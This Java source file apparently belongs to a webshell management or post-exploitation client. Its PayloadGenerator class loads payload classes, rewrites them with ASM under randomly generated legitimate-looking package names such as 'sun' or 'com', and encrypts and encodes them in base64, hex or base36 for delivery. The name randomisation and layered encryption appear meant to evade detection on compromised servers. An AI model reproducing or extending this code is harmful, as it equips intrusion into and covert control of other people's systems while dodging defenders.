package org.b1ackc4t.sender;

import org.b1ackc4t.util.Utils;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.Opcodes;

import java.math.BigInteger;
import java.util.Map;
import java.util.Random;

public class PayloadGenerator {

    private String type;
    private String key;
    public String newClassName;
    private String reqEncode;
    private String resEncode;

    public PayloadGenerator(String type, String key, String reqEncode, String resEncode) {
        this.type = type;
        this.key = key;
        this.reqEncode = reqEncode;
        this.resEncode = resEncode;

    }

    public byte[] getClassData(String clsName, final Map params) throws Exception {
        ClassReader cr = new ClassReader(String.format("org.b1ackc4t.payload.java.%s", clsName));
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
        PayloadClassVisitor cv = new PayloadClassVisitor(Opcodes.ASM9, cw, params);
        cv.setJavaVersion(Opcodes.V1_5);
//        cv.setNewClassName("sun/wfwff/grgeh/Gfegs");
        newClassName = getRandomClassName();
        cv.setNewClassName(newClassName);
        cr.accept(cv, ClassReader.SKIP_DEBUG | ClassReader.SKIP_FRAMES);
        return cw.toByteArray();
    }

    public static String getRandomClassName() {
        String randomName;
        String[] domain1s = new String[]{"com", "cn", "net", "org", "sun", "team"};
        int domain1Index = (new Random()).nextInt(6);
        String domain1 = domain1s[domain1Index];
        String domain2 = Utils.getRandomAlpha((new Random()).nextInt(5) + 2).toLowerCase();
        String domain3 = Utils.getRandomAlpha((new Random()).nextInt(5) + 2).toLowerCase();
        String domain4 = Utils.getRandomAlpha((new Random()).nextInt(5) + 2).toLowerCase();
        String className = Utils.getRandomAlpha((new Random()).nextInt(7) + 3);
        className = Utils.captureName(className);
        int randomSegments = (new Random()).nextInt(3) + 3;// 随机包的层数
        switch(randomSegments) {
            case 3:
                randomName = domain1 + "/" + domain2 + "/" + className;
                break;
            case 4:
                randomName = domain1 + "/" + domain2 + "/" + domain3 + "/" + className;
                break;
            default:
                randomName = domain1 + "/" + domain2 + "/" + domain3 + "/" + domain4 + "/" + className;
                break;
        }
        return randomName;
    }

    public byte[] handlePayloadData(byte[] data) {
        byte[] payload = data;
        try {
            payload = Crypt.encrypt(payload, key, type);
        } catch (Exception e) {
            e.printStackTrace();
        }

        switch (reqEncode) {
            case "base36":
                payload =  new BigInteger(payload).toString(36).getBytes();
                break;
            case "hex":
                payload =  new BigInteger(payload).toString(16).getBytes();
                break;
            default:
                payload = Crypt.b64Encoder.encode(payload);
                break;
        }
        System.out.println("send payload size: " + String.valueOf(payload.length) + " Byte");
        return payload;
    }
}
